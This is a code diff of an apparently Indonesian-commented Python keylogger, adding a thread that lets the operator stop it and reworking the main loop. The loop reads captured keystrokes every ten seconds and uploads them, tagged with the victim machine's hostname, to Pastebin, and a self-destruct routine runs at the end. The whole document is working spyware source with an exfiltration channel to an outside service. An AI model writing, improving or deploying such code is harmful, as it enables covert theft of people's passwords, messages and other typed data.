@@ -65,6 +65,8 @@ class Key():
         self.listener = Listener(on_press=self.on_press)  # Inisialisasi listener
         self.listener.start()  # Mulai listener
 
+
+
 # Fungsi untuk mengirim log ke Pastebin
 def plain_paste(title, contents):
     username = "username"  # Username akun Pastebin
@@ -102,23 +104,31 @@ def plain_paste(title, contents):
     else:
         print(f"Gagal mengupload log ke Pastebin: {r.status_code}")
 
+def stop_keylogger(logkey):
+    # Menunggu input dari pengguna untuk menghentikan keylogger
+    input("Tekan Enter untuk menghentikan keylogger...\n")
+    logkey.flag = 1  # Mengatur flag menjadi 1 untuk menghentikan keylogger
+
 # Fungsi utama
 if __name__ == "__main__":
-    logkey = Key()  # Inisialisasi objek keylogger
-    t = threading.Thread(target=logkey.start)  # Jalankan keylogger di thread terpisah
-    t.start()
+    logkey = Key()
+    t1 = threading.Thread(target=logkey.start)
+    t2 = threading.Thread(target=stop_keylogger, args=(logkey,))
+
+    t1.start()  # Jalankan keylogger
+    t2.start()  # Jalankan thread untuk mendeteksi kapan keylogger harus berhenti
 
     # Loop untuk mengirim log setiap 10 detik
     while logkey.flag != 1:
-        time.sleep(10)  # Menunggu selama 10 detik
-        logs = logkey.read_logs()  # Membaca log
+        time.sleep(10)
+        logs = logkey.read_logs()
 
         if logs:
-            # Kirim log ke Pastebin
             plain_paste(f"Keylogger Logs dari {logkey.hostname}", logs)
             print("Log dikirim ke Pastebin")
         else:
             print("Tidak ada log untuk dikirim.")
 
     logkey.self_destruct()  # Menghentikan keylogger
-    t.join()  # Tunggu thread selesai
+    t1.join()  # Tunggu thread keylogger selesai
+    t2.join()  # Tunggu thread penghentian selesai
